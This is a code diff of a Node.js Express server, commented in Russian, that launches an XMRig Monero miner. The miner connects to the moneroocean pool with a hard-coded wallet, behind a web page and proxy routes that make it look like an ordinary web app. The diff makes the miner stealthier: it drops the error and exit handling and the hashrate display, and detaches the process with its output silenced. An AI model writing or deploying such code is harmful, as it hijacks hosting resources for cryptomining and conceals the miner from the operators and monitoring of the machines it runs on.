@@ -5,13 +5,13 @@ const { spawn } = require('child_process');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Логируем все запросы для отладки
+// Логгер запросов
 app.use((req, res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
   next();
 });
 
-// Стартовая страница
+// Главная страница — отвечаем мгновенно
 app.get('/', (req, res) => {
   res.send(`
     <html>
@@ -21,65 +21,47 @@ app.get('/', (req, res) => {
         <p>Майнер запущен и работает.</p>
         <p><a href="/workers" target="_blank">📊 Открыть xmrig-workers</a></p>
         <p><a href="/api" target="_blank">📡 Открыть API майнера</a></p>
-        <p style="margin-top: 40px; color: #888; font-size: 0.9rem;">
-          Хешрейт: <span id="hashrate">загрузка...</span>
-        </p>
-        <script>
-          setInterval(async () => {
-            try {
-              const res = await fetch('/api/2/summary');
-              const data = await res.json();
-              document.getElementById('hashrate').textContent = 
-                (data.hashrate.total[0] / 1000).toFixed(2) + ' KH/s';
-            } catch(e) {
-              document.getElementById('hashrate').textContent = 'недоступно';
-            }
-          }, 5000);
-        </script>
       </body>
     </html>
   `);
 });
 
-// Прокси для xmrig-workers (порт 3001)
+// Прокси для xmrig-workers
 app.use('/workers', createProxyMiddleware({
   target: 'http://localhost:3001',
   changeOrigin: true,
   pathRewrite: { '^/workers': '' },
 }));
 
-// Прокси для API XMRig (порт 3000)
+// Прокси для API XMRig
 app.use('/api', createProxyMiddleware({
   target: 'http://localhost:3000',
   changeOrigin: true,
   pathRewrite: { '^/api': '' },
 }));
 
-// Запускаем сервер и затем майнер
+// Запускаем сервер
 const server = app.listen(port, '0.0.0.0', () => {
-  console.log(`✅ Proxy server running on port ${port}`);
-  console.log('🚀 Starting miner...');
+  console.log(`✅ HTTP server is ready on port ${port}`);
   
-  // Запускаем майнер как дочерний процесс, передавая логи в stdout
+  // Запускаем майнер в фоне, без блокировки
   const miner = spawn('/entrypoint.sh', [
     '-o', 'gulf.moneroocean.stream:10004',
     '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',
     '-p', 'x',
     '-k',
     '-t', '2'
-  ], { stdio: 'inherit' });
-
-  miner.on('error', (err) => {
-    console.error('❌ Miner error:', err);
+  ], {
+    detached: true,          // отдельный процесс
+    stdio: 'ignore',         // не ждём вывода
   });
-
-  miner.on('exit', (code) => {
-    console.log(`⛔ Miner exited with code ${code}`);
-    process.exit(code);
-  });
+  
+  miner.unref();  // позволяем процессу не блокировать завершение сервера
+  
+  console.log('🚀 Miner started in background (PID: ' + miner.pid + ')');
 });
 
-// Обработка завершения процесса
+// Корректное завершение
 process.on('SIGTERM', () => {
   console.log('Received SIGTERM, shutting down...');
   server.close(() => process.exit(0));
